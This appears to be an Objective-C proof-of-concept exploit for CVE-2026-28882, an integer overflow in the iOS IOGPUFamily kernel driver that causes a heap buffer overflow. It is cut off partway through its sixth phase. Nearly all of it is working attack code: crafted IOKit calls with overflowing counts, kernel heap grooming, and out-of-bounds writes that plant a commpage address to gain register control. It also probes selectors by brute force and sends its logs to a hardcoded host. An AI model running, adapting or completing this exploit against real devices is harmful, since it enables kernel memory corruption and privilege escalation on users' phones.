/*
 * iogpu_residency_bof.m — CVE-2026-28882 PoC
 * IOGPUFamily s_group_add_resources integer overflow -> heap BOF
 *
 * Bug: s_group_add_resources (rel=0x8468 in 26.3.1 IOGPUFamily) reads
 * user-supplied count from IOUserClient arg struct at [arg2+0x20].
 * The count is used in signed arithmetic: smull(count, element_size) + 8.
 * When count = INT32_MIN (-2147483648), the multiplication overflows:
 *   smull(-1, 24) + 8 = -16 -> kalloc(-16) = small/bogus allocation.
 * Subsequent writes of count elements corrupt adjacent kernel heap.
 *
 * Trigger path (firmware-confirmed, iOS 26.5 binary):
 *   IOServiceOpen(AGXAcceleratorG18P, task, type=1, &conn)
 *   -> IOConnectCallMethod(conn, sel=6, struct[0x408], count@[+0x20])
 *   -> IOGPUDeviceUserClient::s_group_add_resources kernel function
 *   (selector 0x196 was wrong — SGAR is at index 6 in the dispatch table)
 *   -> integer overflow in element array size computation
 *
 * Variant 2 (also affects same code): craft count = 0x80000001 so
 *   count*2 = 0x100000002, truncated to 0x00000002 in 32-bit.
 *   Array allocated for 2 elements (16 bytes), but count elements are
 *   written -> kernel heap overflow by count*element_size - 16 bytes.
 *
 * Observable: kernel panic (NULL dereference from corrupt zone metadata)
 *   or AllocatorProbe canary death (kalloc zone corruption).
 *
 * Patch: Apple added cmn w23,#1; csel x1,x8,x9,gt overflow guard in 26.4.
 *
 * Platform: iOS 26.3.1 (23D8133), iPhone 16 Pro Max (AGXG18P)
 */

#import <UIKit/UIKit.h>
#import <Metal/Metal.h>
#import <WebKit/WebKit.h>
#import <pthread.h>
#import <stdatomic.h>
#import <sys/types.h>
#import <sys/sysctl.h>
#import <os/log.h>

#define REPORT_HOST "192.168.68.106"
#define REPORT_PORT 9999

static os_log_t g_log;

/* AllocatorProbe: NOTE — MTLBuffer allocations do NOT land in kernel kalloc.8.
 * The correct canaries for kalloc.8 are count=0 SGAR groups (see Phase 4).
 * Keeping this block for baseline logging only; CANARY_SIZE=8 is a no-op here. */
#define CANARY_ALLOC_COUNT  8000
#define CANARY_SIZE         8    /* kalloc.8 is the OOB target zone */

/* Phase 4 constants */
#define GROOM_COUNT         2048
/* Commpage flag userspace alias — kernel jumping here = register control (GPR=this) */
#define COMMPAGE_FLAG       0x0000000FFFFFC330ULL

static WKWebView *g_wv = nil;
static _Atomic int g_done = 0;
static FILE *g_bof_log = NULL;

static void report(const char *msg) {
    if (!g_log) g_log = os_log_create("com.nexus.bof", "debug");
    os_log(g_log, "[BOF] %{public}s", msg);
    NSLog(@"[BOF] %s", msg);
    if (g_bof_log) { fprintf(g_bof_log, "%s\n", msg); fflush(g_bof_log); }
    WKWebView *wv = g_wv;
    if (!wv) return;
    NSString *s = [NSString stringWithUTF8String:msg];
    if (!s) return;
    s = [s stringByReplacingOccurrencesOfString:@"'" withString:@"\\'"];
    NSString *u = [NSString stringWithFormat:@"http://%s:%d/", REPORT_HOST, REPORT_PORT];
    NSString *js = [NSString stringWithFormat:
        @"var r=new XMLHttpRequest();r.open('POST','%@',true);r.send('[cve28882] %@');", u, s];
    dispatch_async(dispatch_get_main_queue(), ^{
        [wv evaluateJavaScript:js completionHandler:nil];
    });
}

static void evf(const char *fmt, ...) {
    char buf[512]; va_list ap;
    va_start(ap, fmt); vsnprintf(buf, sizeof(buf), fmt, ap); va_end(ap);
    report(buf);
}

/* Spray kernel heap with canary objects to detect corruption */
static NSMutableArray *g_canaries = nil;
static void spray_canaries(id<MTLDevice> dev) {
    g_canaries = [NSMutableArray array];
    /* Use MTLBuffer allocations of CANARY_SIZE to populate kalloc zones */
    for (int i = 0; i < CANARY_ALLOC_COUNT; i++) {
        id<MTLBuffer> b = [dev newBufferWithLength:CANARY_SIZE
                                          options:MTLResourceStorageModeShared];
        if (b) {
            /* Write canary pattern */
            uint8_t *p = (uint8_t *)b.contents;
            for (int j = 0; j < CANARY_SIZE; j++)
                p[j] = 0xCA;
            [g_canaries addObject:b];
        }
    }
    evf("spray_canaries: %d allocations in kalloc.%d zone", (int)g_canaries.count, CANARY_SIZE);
}

/* Check canaries for corruption */
static int check_canaries(void) {
    int corrupt = 0;
    for (id<MTLBuffer> b in g_canaries) {
        uint8_t *p = (uint8_t *)b.contents;
        for (int j = 0; j < CANARY_SIZE; j++) {
            if (p[j] != 0xCA) { corrupt++; break; }
        }
    }
    return corrupt;
}

/* Trigger the BOF by creating MTLResidencySet and adding overflow count */
static void trigger_bof(id<MTLDevice> dev) {
    evf("STARTING BOF trigger: CVE-2026-28882");

    /* Step 1: Build large array of MTLBuffer resources to add */
    /* Use small buffers (4 bytes each) — we need many to fill the set */
    const int RESOURCE_COUNT = 64;
    NSMutableArray *resources = [NSMutableArray arrayWithCapacity:RESOURCE_COUNT];
    for (int i = 0; i < RESOURCE_COUNT; i++) {
        id<MTLBuffer> b = [dev newBufferWithLength:4
                                          options:MTLResourceStorageModePrivate];
        if (b) [resources addObject:b];
    }
    evf("created %d resource buffers", (int)resources.count);

    /* Step 2: Create MTLResidencySet (iOS 18+, maps to IOGPUResidentMemorySet) */
    if (@available(iOS 18.0, *)) {
        MTLResidencySetDescriptor *desc = [[MTLResidencySetDescriptor alloc] init];
        desc.label = @"cve28882_test";
        desc.initialCapacity = 2; /* Start with minimal capacity (2 = inline threshold) */

        NSError *err = nil;
        id<MTLResidencySet> rset = [dev newResidencySetWithDescriptor:desc error:&err];
        if (!rset) {
            evf("newResidencySet failed: %s",
                err ? err.localizedDescription.UTF8String : "nil");
            /* Fallback: try via MTLRenderCommandEncoder useResources path */
            goto fallback_path;
        }

        evf("MTLResidencySet created");

        /* Step 3: Add legitimate resources first to warm up the array */
        __unsafe_unretained id<MTLAllocation> *arr =
            (__unsafe_unretained id<MTLAllocation> *)alloca(resources.count * sizeof(id));
        for (int i = 0; i < (int)resources.count; i++)
            arr[i] = (id<MTLAllocation>)resources[i];

        /* Add small batch to grow beyond inline (2-element) threshold */
        [rset addAllocations:arr count:MIN(4, (NSUInteger)resources.count)];
        [rset commit];
        evf("added 4 resources (grown beyond inline threshold)");

        /* Step 4: Trigger integer overflow via Metal API directly.
         * Pass arr (64 items) but claim OVERFLOW_COUNT items.
         * Metal framework may not validate count <= arr length.
         * If passed through, kernel s_group_add_resources receives
         * count = OVERFLOW_COUNT with no bounds check (26.3.1).
         *
         * count=0x20000000: smull(0x20000000, 24)+8 mod 2^32 = 8 bytes alloc
         * but OVERFLOW_COUNT elements copied -> kernel heap BOF.
         *
         * count=0x80000000 (INT32_MIN as int32): smull overflows
         * to large 64-bit value -> kalloc fails but interesting. */

        /* Metal overflow attempts disabled: Metal iterates arr before kernel call
         * causing SIGSEGV when arr has only 64 elements but count=0x20000000.
         * Overflow must be triggered via raw IOKit path in trigger_bof_iokit(). */
        evf("Metal API path baseline confirmed (count=4 OK)");
        evf("Metal overflow requires raw IOKit path (Metal iterates arr pre-kernel)");

        /* Test: nil-filled heap array — Metal nil-messaging returns 0 GPU addr */
        /* calloc gives zeroed memory so arr[4..N-1] are nil (ObjC messages to nil = 0) */
        #define NIL_TEST_COUNT 1024
        __unsafe_unretained id<MTLAllocation> *nil_arr =
            (__unsafe_unretained id<MTLAllocation>*)calloc(NIL_TEST_COUNT, sizeof(id));
        if (nil_arr) {
            for (int i = 0; i < 4 && i < (int)resources.count; i++)
                nil_arr[i] = (id<MTLAllocation>)resources[i];
            /* Test Metal nil handling: count=NIL_TEST_COUNT, only 4 real, rest nil */
            [rset addAllocations:nil_arr count:NIL_TEST_COUNT];
            evf("nil_arr count=%d: Metal handled nil allocations (no crash)", NIL_TEST_COUNT);
            free(nil_arr);
        }

    fallback_path:;
        /* Alternate trigger: MTLRenderCommandEncoder useResources */
        MTLRenderPassDescriptor *rpd = [MTLRenderPassDescriptor renderPassDescriptor];
        rpd.colorAttachments[0].loadAction  = MTLLoadActionClear;
        rpd.colorAttachments[0].storeAction = MTLStoreActionStore;

        /* Create 1x1 drawable texture as render target */
        MTLTextureDescriptor *td = [[MTLTextureDescriptor alloc] init];
        td.width = 1; td.height = 1;
        td.pixelFormat = MTLPixelFormatBGRA8Unorm;
        td.usage = MTLTextureUsageRenderTarget;
        id<MTLTexture> rt = [dev newTextureWithDescriptor:td];
        rpd.colorAttachments[0].texture = rt;

        id<MTLCommandQueue> cq = [dev newCommandQueue];
        id<MTLCommandBuffer> cb = [cq commandBuffer];
        id<MTLRenderCommandEncoder> enc = [cb renderCommandEncoderWithDescriptor:rpd];

        /* Build resources array with OVERFLOW_COUNT but only RESOURCE_COUNT real objects */
        /* The Metal framework will pass count to the kernel as-is */
        id<MTLBuffer> overflow_arr[RESOURCE_COUNT];
        for (int i = 0; i < RESOURCE_COUNT; i++)
            overflow_arr[i] = resources[i];

        /* Normal addResources call first (baseline) */
        [enc useResources:(id<MTLResource>*)overflow_arr
                    count:RESOURCE_COUNT
                    usage:MTLResourceUsageRead];

        evf("useResources normal: count=%d OK", RESOURCE_COUNT);

        /* Now attempt with artificially large count via IOUserClient direct path
         * (the Metal framework itself caps count, so we need raw IOKit calls) */

        [enc endEncoding];
        [cb commit];

        evf("encoder path completed (kernel state intact)");
    } else {
        evf("MTLResidencySet unavailable (iOS < 17.0)");
    }
}

/* IOUserClient direct approach for overflow trigger */
/* This bypasses the Metal API layer to send crafted count to kernel */
#include <mach/mach.h>
#include <CoreFoundation/CoreFoundation.h>

typedef mach_port_t io_service_t;
typedef mach_port_t io_connect_t;
typedef mach_port_t io_iterator_t;
typedef mach_port_t io_object_t;

extern kern_return_t IOMasterPort(mach_port_t bp, mach_port_t *mp);
extern CFMutableDictionaryRef IOServiceMatching(const char *name);
extern kern_return_t IOServiceGetMatchingServices(mach_port_t mp, CFDictionaryRef match, io_iterator_t *it);
extern io_object_t IOIteratorNext(io_iterator_t it);
extern kern_return_t IOObjectRelease(io_object_t obj);
extern kern_return_t IOServiceOpen(io_service_t svc, task_port_t task, uint32_t type, io_connect_t *conn);
extern kern_return_t IOServiceClose(io_connect_t conn);
extern kern_return_t IOConnectCallMethod(io_connect_t conn, uint32_t sel,
    const uint64_t *in, uint32_t inCnt, const void *inStruct, size_t inSz,
    uint64_t *out, uint32_t *outCnt, void *outStruct, size_t *outSz);

/*
 * s_group_add_resources dispatch table analysis (iOS 26.5 firmware):
 *   Class:    IOGPUDeviceUserClient
 *   Type:     1 (AGXAcceleratorG18P)
 *   Selector: 6  (NOT 0x196 — that was wrong)
 *   st_in:    0xffffffff (variable, function enforces 0x408 internally)
 *   st_out:   0x10 (16 bytes)
 *   Size check at 0xfffffe0009bebb74: cmp w8,#0x408; ccmp w8,w9,#0,hs; b.eq proceed
 *   Count:    [structInput + 0x20] uint32_t
 */
#define SGAR_SELECTOR        6
#define SGAR_STRUCT_SIZE     0x410   /* confirmed live: device->0x278 == 0x410 */
#define SGAR_COUNT_OFFSET    0x20

/* try_sgar: call sel=6 with given count and optional group_handle in struct.
 * group_handle_off=0 means new group (handle=0 → create). Non-zero offset
 * with a valid group_id puts the handle at that offset to trigger add-to-existing.
 * Returns group_id from out[0] or 0 on failure. */
static uint64_t try_sgar_ex(io_connect_t conn, uint32_t count, const char *label,
                              uint32_t group_handle, uint32_t handle_off) {
    static uint8_t add_in[SGAR_STRUCT_SIZE];
    uint8_t add_out[0x10];
    size_t  add_out_sz = sizeof(add_out);
    uint32_t out_cnt   = 0;

    memset(add_in,  0, sizeof(add_in));
    memset(add_out, 0, sizeof(add_out));
    *(uint32_t *)(add_in + SGAR_COUNT_OFFSET) = count;
    if (handle_off > 0 && handle_off + 4 <= SGAR_STRUCT_SIZE)
        *(uint32_t *)(add_in + handle_off) = group_handle;

    kern_return_t kr = IOConnectCallMethod(conn, SGAR_SELECTOR,
        NULL, 0, add_in, sizeof(add_in),
        NULL, &out_cnt, add_out, &add_out_sz);

    evf("[BOF] %s count=0x%x hoff=0x%x kr=0x%x", label, count, handle_off, kr);
    if (kr == 0) {
        uint64_t gid = *(uint64_t *)add_out;
        evf("[BOF] %s SUCCESS group_id=0x%llx", label, gid);
        return gid;
    }
    return 0;
}

static uint64_t try_sgar(io_connect_t conn, uint32_t count, const char *label) {
    return try_sgar_ex(conn, count, label, 0, 0);
}

/* try_sel7: call sel=7 with group_id scalar — triggers group lifecycle operation */
static kern_return_t try_sel7(io_connect_t conn, uint32_t group_id, const char *label) {
    uint64_t sc_in[1] = { group_id };
    kern_return_t kr = IOConnectCallMethod(conn, 7,
        sc_in, 1, NULL, 0,
        NULL, NULL, NULL, NULL);
    evf("[BOF] %s sel=7 group_id=0x%x kr=0x%x", label, group_id, kr);
    return kr;
}

/* try_sel8: call sel=8 with group_id in struct — variable in/out operation */
static kern_return_t try_sel8(io_connect_t conn, uint32_t group_id, const char *label) {
    uint8_t s8_in[SGAR_STRUCT_SIZE];
    uint8_t s8_out[SGAR_STRUCT_SIZE];
    size_t  s8_out_sz = sizeof(s8_out);
    uint32_t out_cnt = 0;

    memset(s8_in,  0, sizeof(s8_in));
    memset(s8_out, 0, sizeof(s8_out));
    /* Group ID likely at [0x00] of struct for sel=8 */
    *(uint32_t *)(s8_in + 0x00) = group_id;
    /* Also try at [0x20] in case sel=8 uses same count field */
    *(uint32_t *)(s8_in + 0x20) = 2;  /* try adding 2 resources */

    kern_return_t kr = IOConnectCallMethod(conn, 8,
        NULL, 0, s8_in, sizeof(s8_in),
        NULL, &out_cnt, s8_out, &s8_out_sz);
    evf("[BOF] %s sel=8 group_id=0x%x kr=0x%x", label, group_id, kr);
    return kr;
}

/* Quiet variants — suppress per-call logging for high-volume spray */
static uint64_t try_sgar_q(io_connect_t conn, uint32_t count) {
    static uint8_t s[SGAR_STRUCT_SIZE];
    uint8_t out[0x10]; size_t out_sz = sizeof(out); uint32_t cnt = 0;
    memset(s, 0, sizeof(s));
    *(uint32_t *)(s + SGAR_COUNT_OFFSET) = count;
    kern_return_t kr = IOConnectCallMethod(conn, SGAR_SELECTOR,
        NULL, 0, s, sizeof(s), NULL, &cnt, out, &out_sz);
    if (kr == 0) return *(uint64_t *)out;
    return 0;
}

static kern_return_t try_sel7_q(io_connect_t conn, uint32_t gid) {
    uint64_t sc[1] = { gid };
    return IOConnectCallMethod(conn, 7, sc, 1, NULL, 0, NULL, NULL, NULL, NULL);
}

/*
 * trigger_phase4: groom kalloc.8 with count=0 SGAR groups (8-byte resource_arrays),
 * overwrite adjacent chunk with COMMPAGE_FLAG via OOB write, then trigger
 * all groomed groups to observe corruption (sel=7 returns kr≠0 if fn_B sees
 * count mismatch in the overwritten resource_array).
 *
 * OOB write anatomy (count=0x80000000, element_size=4):
 *   alloc_size = (0x80000000 * 4) mod 2^32 + 8 = 0 + 8 = 8 bytes
 *   Copy writes struct[0x28..0x2F] -> resource_array[8..15] (OOB by 8 bytes)
 *   resource_array[8..15] = adjacent kalloc.8 chunk's first 8 bytes
 *
 * Detection: baseline sel=7 on count=0 groups returns kr=0.
 *   After overflow, a corrupted group returns kr≠0 from fn_B count mismatch.
 */
static void trigger_phase4(io_connect_t conn) {
    evf("[P4] START: groom %d count=0 groups -> kalloc.8 spray", GROOM_COUNT);

    uint32_t groom_gids[GROOM_COUNT];
    int groom_valid = 0;
    for (int gi = 0; gi < GROOM_COUNT; gi++) {
        uint64_t g = try_sgar_q(conn, 0);
        if (g) groom_gids[groom_valid++] = (uint32_t)g;
    }
    evf("[P4] GROOM done: %d/%d groups created in kalloc.8", groom_valid, GROOM_COUNT);

    /* Baseline: sel=7 on all should return kr=0 (count=0 groups have no work) */
    int baseline_ok = 0, baseline_fail = 0;
    for (int gi = 0; gi < groom_valid; gi++) {
        kern_return_t bkr = try_sel7_q(conn, groom_gids[gi]);
        if (bkr == 0) baseline_ok++; else baseline_fail++;
    }
    evf("[P4] BASELINE: kr=0 -> %d, kr!=0 -> %d (expect all 0)", baseline_ok, baseline_fail);

    /* OOB write: count=0x80000000, fill entry region with COMMPAGE_FLAG.
     * struct[0x28..0x2F] = COMMPAGE_FLAG -> resource_array[8..15] = adjacent chunk */
    static uint8_t cs[SGAR_STRUCT_SIZE];
    uint8_t co[0x10]; size_t co_sz = sizeof(co); uint32_t co_cnt = 0;
    memset(cs, 0, sizeof(cs));
    *(uint32_t *)(cs + SGAR_COUNT_OFFSET) = 0x80000000u;
    for (uint32_t off = 0x28; off + 8 <= SGAR_STRUCT_SIZE; off += 8)
        *(uint64_t *)(cs + off) = COMMPAGE_FLAG;
    kern_return_t ckr = IOConnectCallMethod(conn, SGAR_SELECTOR,
        NULL, 0, cs, sizeof(cs), NULL, &co_cnt, co, &co_sz);
    uint64_t corrupt_gid = (ckr == 0) ? *(uint64_t *)co : 0;
    evf("[P4] OOB_WRITE count=0x80000000 entries=0x%016llx kr=0x%x gid=0x%llx",
        COMMPAGE_FLAG, ckr, corrupt_gid);

    /* Second variant: only first entry = COMMPAGE_FLAG so adjacent[0..7]=COMMPAGE_FLAG */
    uint64_t cgid2 = 0;
    {
        static uint8_t cs2[SGAR_STRUCT_SIZE];
        uint8_t co2[0x10]; size_t co2_sz = sizeof(co2); uint32_t co2_cnt = 0;
        memset(cs2, 0, sizeof(cs2));
        *(uint32_t *)(cs2 + SGAR_COUNT_OFFSET) = 0x80000000u;
        *(uint64_t *)(cs2 + 0x28) = COMMPAGE_FLAG;   /* adjacent[0..7] = COMMPAGE_FLAG */
        *(uint64_t *)(cs2 + 0x30) = 0;               /* adjacent[8..] = 0 if hit */
        kern_return_t ckr2 = IOConnectCallMethod(conn, SGAR_SELECTOR,
            NULL, 0, cs2, sizeof(cs2), NULL, &co2_cnt, co2, &co2_sz);
        cgid2 = (ckr2 == 0) ? *(uint64_t *)co2 : 0;
        evf("[P4] OOB_EXACT adjacent=COMMPAGE_FLAG kr=0x%x gid=0x%llx", ckr2, cgid2);
    }

    /* Trigger: sel=7 on all groomed groups. Corrupted groups will return kr!=0 */
    int post_ok = 0, post_fail = 0;
    uint32_t first_corrupt_gid = 0;
    for (int gi = 0; gi < groom_valid; gi++) {
        kern_return_t pkr = try_sel7_q(conn, groom_gids[gi]);
        if (pkr == 0) post_ok++;
        else {
            post_fail++;
            if (!first_corrupt_gid) first_corrupt_gid = groom_gids[gi];
        }
    }
    evf("[P4] POST_TRIGGER: kr=0 -> %d, kr!=0 -> %d (non-zero = OOB HIT!)",
        post_ok, post_fail);
    if (first_corrupt_gid)
        evf("[P4] FIRST_CORRUPT gid=0x%x OOB_CONFIRMED -> adjacent kalloc.8 chunk written",
            first_corrupt_gid);

    /* Probe selectors 7-20 on: (a) OOB_EXACT group (cgid2), (b) first corrupted groomed group */
    uint32_t probe_gids[2] = { (uint32_t)cgid2, first_corrupt_gid };
    for (int pi = 0; pi < 2; pi++) {
        uint32_t pg = probe_gids[pi];
        if (!pg) continue;
        for (uint32_t sel = 7; sel <= 20; sel++) {
            uint64_t sc[2] = { pg, 0 };
            uint8_t so[0x40]; size_t so_sz = sizeof(so); uint32_t so_cnt = 0;
            uint8_t si_buf[0x410]; size_t si_sz = sizeof(si_buf); uint32_t si_cnt = 0;
            memset(si_buf, 0, sizeof(si_buf));
            *(uint32_t *)(si_buf + 0) = pg;  /* group id in struct[0] */
            *(uint32_t *)(si_buf + 4) = pg;  /* also at [4] */
            kern_return_t pkr = IOConnectCallMethod(conn, sel,
                sc, 2, si_buf, sizeof(si_buf), NULL, &si_cnt, so, &so_sz);
            evf("[P4] PROBE gid=0x%x sel=%u kr=0x%x", pg, sel, pkr);
        }
    }

    evf("[P4] DONE — if device panics now, check IPS for GPR=0x%016llx", COMMPAGE_FLAG);
}

/*
 * trigger_phase5: F-109 backward OOB via SGAR count=0xFFFFFFFF (-1 signed).
 *
 * F-109 path (from 26.5 KC function at 0xfffffe0009c05a84):
 *   ldrsw x8, [obj, #0x424]       ; signed load: count=0xFFFFFFFF -> x8=-1
 *   smull x10, w8, #element_size  ; -1 * 24 = -24
 *   add x10, x10, #8              ; -24 + 8 = -16 (alloc_size)
 *   IOMallocTypeVar(size=-16) -> alloc_ptr (kalloc_type_var zone)
 *   str w19, [alloc_ptr - 16]     ; writes 4 controlled bytes 16B before alloc
 *   strb w8, [alloc_ptr - 8]      ; writes 1 byte 8B before alloc
 *
 * Strategy:
 *   1. Groom: create GROOM_COUNT groups with count=15 each in kalloc_type_var.
 *      If count=15 is stored at offset 12 of the 24B element:
 *      preceding_element[12..15] = 0x0000000F
 *   2. Trigger: SGAR count=0xFFFFFFFF with struct[0x28..0x2B]=0xFFFFC330 (=w19).
 *      If F-109 fires: writes 0xFFFFC330 at preceding_element[8..11].
 *      Combined: 8-byte value at preceding_element[8..15] = 0x0000000FFFFFC330
 *                = COMMPAGE_FLAG.
 *   3. Observation: if device panics with FAR/PC near 0x0000000FFFFFC330 -> F-74 chain
 *      reached. Check IPS for COMMPAGE_FLAG in registers.
 *
 * Note: OOB_EXACT variant (struct[0x28..0x2F] = COMMPAGE_FLAG 8 bytes) also tested —
 * writes both 4-byte halves if F-109 writes 8 bytes instead of 4.
 */
#define P5_GROOM_COUNT  2048
#define P5_GROOM_RCOUNT 15   /* count=15 -> offset 12 = 0x0F if stored there */

static void trigger_phase5(io_connect_t conn) {
    evf("[P5] START: F-109 backward OOB test (count=0xFFFFFFFF, 24B entry format)");

    /* Phase 5a: groom kalloc_type_var zone with count=15 groups */
    uint32_t p5_groom[P5_GROOM_COUNT];
    int p5_valid = 0;
    for (int gi = 0; gi < P5_GROOM_COUNT; gi++) {
        uint64_t g = try_sgar_q(conn, P5_GROOM_RCOUNT);
        if (g) p5_groom[p5_valid++] = (uint32_t)g;
    }
    evf("[P5] GROOM: %d/%d count=15 groups created", p5_valid, P5_GROOM_COUNT);

    /* Baseline sel=7 on all groom groups */
    int b5_ok = 0, b5_fail = 0;
    for (int gi = 0; gi < p5_valid; gi++) {
        kern_return_t bkr = try_sel7_q(conn, p5_groom[gi]);
        if (bkr == 0) b5_ok++; else b5_fail++;
    }
    evf("[P5] BASELINE: kr=0->%d kr!=0->%d", b5_ok, b5_fail);

    /* Phase 5b: trigger F-109 — count=0xFFFFFFFF (-1 signed), 24-byte entry format.
     * struct[0x28..0x2B] = 0xFFFFC330 -> w19 = 0xFFFFC330 (if this becomes the write val).
     * OOB_EXACT: struct[0x28..0x2F] = COMMPAGE_FLAG (8 bytes) in case write is 8B not 4B. */
    static uint8_t p5_struct[SGAR_STRUCT_SIZE];
    uint8_t p5_out[0x10]; size_t p5_out_sz = sizeof(p5_out); uint32_t p5_cnt = 0;
    memset(p5_struct, 0, sizeof(p5_struct));
    *(uint32_t *)(p5_struct + SGAR_COUNT_OFFSET) = 0xFFFFFFFFu;  /* count = -1 signed */
    /* 24-byte entry format: each entry has first 4B = resource_id, rest = metadata */
    for (uint32_t off = 0x28; off + 24 <= SGAR_STRUCT_SIZE; off += 24) {
        /* Entry first 4B = 0xFFFFC330 (= w_val candidate for backward write) */
        *(uint32_t *)(p5_struct + off) = 0xFFFFC330u;
        /* Entry bytes 4-11 = COMMPAGE_FLAG (in case 8-byte write is used) */
        *(uint64_t *)(p5_struct + off + 4) = COMMPAGE_FLAG;
    }
    /* Also set struct[0x28..0x2F] = COMMPAGE_FLAG directly (4+4 split) */
    *(uint32_t *)(p5_struct + 0x28) = 0xFFFFC330u;     /* lower 32 bits */
    *(uint32_t *)(p5_struct + 0x2C) = 0x0000000Fu;     /* upper 32 bits -> COMMPAGE_FLAG */

    kern_return_t p5kr = IOConnectCallMethod(conn, SGAR_SELECTOR,
        NULL, 0, p5_struct, sizeof(p5_struct), NULL, &p5_cnt, p5_out, &p5_out_sz);
    uint64_t p5_gid = (p5kr == 0) ? *(uint64_t *)p5_out : 0;
    evf("[P5] F109_TRIGGER count=0xFFFFFFFF kr=0x%x gid=0x%llx", p5kr, p5_gid);

    /* Phase 5c: check groom groups for anomaly (sel=7 count mismatch = forward corruption).
     * F-109 backward OOB hits preceding_element[8..11], not count@[0..3].
     * So sel=7 detection won't catch F-109. Instead we watch for device panic. */
    int p5_post_ok = 0, p5_post_fail = 0;
    uint32_t p5_first_bad = 0;
    for (int gi = 0; gi < p5_valid; gi++) {
        kern_return_t pkr = try_sel7_q(conn, p5_groom[gi]);
        if (pkr == 0) p5_post_ok++;
        else { p5_post_fail++; if (!p5_first_bad) p5_first_bad = p5_groom[gi]; }
    }
    evf("[P5] POST: kr=0->%d kr!=0->%d first_bad=0x%x", p5_post_ok, p5_post_fail, p5_first_bad);

    /* Phase 5d: variant with 4-byte entry format (element_size=4 path), count=-1.
     * alloc_size = (-1*4)+8 = 4 bytes. str w19, [alloc-16] = writes to alloc[-16].
     * alloc[-16] is 16 bytes before the 4-byte allocation -> different zone offset. */
    {
        static uint8_t p5b_struct[SGAR_STRUCT_SIZE];
        uint8_t p5b_out[0x10]; size_t p5b_out_sz = sizeof(p5b_out); uint32_t p5b_cnt = 0;
        memset(p5b_struct, 0, sizeof(p5b_struct));
        *(uint32_t *)(p5b_struct + SGAR_COUNT_OFFSET) = 0xFFFFFFFFu;
        /* 4-byte entry format: pack 0xFFFFC330 at every 4-byte slot */
        for (uint32_t off = 0x28; off + 4 <= SGAR_STRUCT_SIZE; off += 4)
            *(uint32_t *)(p5b_struct + off) = 0xFFFFC330u;
        kern_return_t p5bkr = IOConnectCallMethod(conn, SGAR_SELECTOR,
            NULL, 0, p5b_struct, sizeof(p5b_struct), NULL, &p5b_cnt, p5b_out, &p5b_out_sz);
        uint64_t p5b_gid = (p5bkr == 0) ? *(uint64_t *)p5b_out : 0;
        evf("[P5] F109_4B count=0xFFFFFFFF 4B-fmt kr=0x%x gid=0x%llx", p5bkr, p5b_gid);
    }

    evf("[P5] DONE — watch for panic with GPR=0x%016llx or FAR near commpage", COMMPAGE_FLAG);
    evf("[P5] DONE — if no panic: F-109 path not triggered by SGAR count=-1 -> check other selectors");
}

/*
 * trigger_phase6: Find s_group_remove_resources selector and trigger F-109 via
 * integer underflow.
 *
 * Strategy:
 *   1. Create a count=4 group -> group_id G1.
 *   2. Probe selectors 0-30 with SGAR-format struct (group_id=G1, count=1 at [+0x20]).
 *      A selector that accepts this and decrements the resource count is REMOVE.
 *   3. Once REMOVE found: create count=0 group G2, call REMOVE(G2, count=1) -> COUNT=-1.
 *   4. Call SGAR(count=1) on same G2 to trigger repack (F-109 backward OOB).
 *   5. Groom: 2048 count=15 groups so preceding element has 0x0F at bytes [12..15].
 *   6. Watch for panic with GPR=COMMPAGE_FLAG.
 */
static void trigger_phase6(io_connect_t conn) {
    evf("[P6] START: F-109 selector probe + integer underflow chain");

    /* Phase 6a: Create a reference group with count=4 (for remove testing) */
    static uint8_t ref_s[SGAR_STRUCT_SIZE];
    uint8_t ref_out[0x10]; size_t ref_out_sz = sizeof(ref_out); uint32_t ref_cnt = 0;
    memset(ref_s, 0, sizeof(ref_s));
    *(uint32_t *)(ref_s + SGAR_COUNT_OFFSET) = 4;
    /* Pack 4 valid-looking resource handles at entries[0..3] */
    for (int i = 0; i < 4; i++)
        *(uint32_t *)(ref_s + 0x28 + i*4) = (uint32_t)(i + 0x1000);
    kern_return_t gkr = IOConnectCallMethod(conn, SGAR_SELECTOR,
        NULL, 0, ref_s, sizeof(ref_s), NULL, &ref_cnt, ref_out, &ref_out_sz);
    uint64_t ref_gid = (gkr == 0) ? *(uint64_t *)ref_out : 0;
    evf("[P6] REF_GROUP count=4 kr=0x%x gid=0x%llx", gkr, ref_gid);
    if (!ref_gid) {
        evf("[P6] ABORT: cannot create reference group");
        return;
    }

    /* Phase 6b: Probe each selector 0-30 with SGAR-format struct containing ref_gid.
     * We encode ref_gid at [+0x00] (group id field) and count=1 at [+0x20].
     * A REMOVE selector would: look up group by gid, decrement count by 1. */
    int remove_sel = -1;
    for (int sel = 0; sel <= 30; sel++) {
        if (sel == SGAR_SELECTOR) continue;  /* skip ADD selector */
        static uint8_t ps[SGAR_STRUCT_SIZE];
        uint8_t pout[0x40]; size_t poutsz = sizeof(pout); uint32_t pcnt = 0;
        memset(ps, 0, sizeof(ps));
        /* Try group_id in multiple common locations */
        *(uint32_t *)(ps + 0x00) = (uint32_t)ref_gid;
        *(uint32_t *)(ps + 0x04) = (uint32_t)(ref_gid >> 32);
        *(uint32_t *)(ps + 0x20) = 1;  /* count=1 at SGAR_COUNT_OFFSET */
        *(uint32_t *)(ps + 0x28) = (uint32_t)(0x1000);  /* first entry */
        kern_return_t pkr = IOConnectCallMethod(conn, sel,
            NULL, 0, ps, sizeof(ps), NULL, &pcnt, pout, &poutsz);
        if (pkr == 0) {
            evf("[P6] SEL%d STRUCT: kr=0x0 (LIVE) pcnt=%u pout[0..7]=%02x%02x%02x%02x%02x%02x%02x%02x",
                sel, pcnt, pout[0],pout[1],pout[2],pout[3],pout[4],pout[5],pout[6],pout[7]);
            if (remove_sel < 0) remove_sel = sel;  /* first hit = candidate REMOVE */
        } else if (pkr != 0xe00002c2 && pkr != 0xe00002be) {
            /* Interesting error (not generic BAD_ARGUMENT) */
            evf("[P6] SEL%d STRUCT: kr=0x%x (interesting)", sel, pkr);
        }

        /* Also try with scalar input (just the group_id) */
        uint64_t sc_in[2] = { ref_gid, 1 };
        uint8_t sc_out[0x10]; size_t sc_outsz = sizeof(sc_out); uint32_t sc_cnt = 0;
        kern_return_t skr = IOConnectCallMethod(conn, sel,
            sc_in, 2, NULL, 0, NULL, &sc_cnt, sc_out, &sc_outsz);
        if (skr == 0 && sel != 7) {  /* sel=7 already known */
            evf("[P6] SEL%d SCALAR(gid,1): kr=0x0 (LIVE) sc_cnt=%u", sel, sc_cnt);
        }
    }
    evf("[P6] PROBE DONE: remove_sel=%d", remove_sel);

    if (remove_sel < 0) {
        evf("[P6] REMOVE selector not found via struct probe -> try scalar overflow");
        /* Phase 6b-fallback: use sel=7 scalar + repeated calls to underflow.
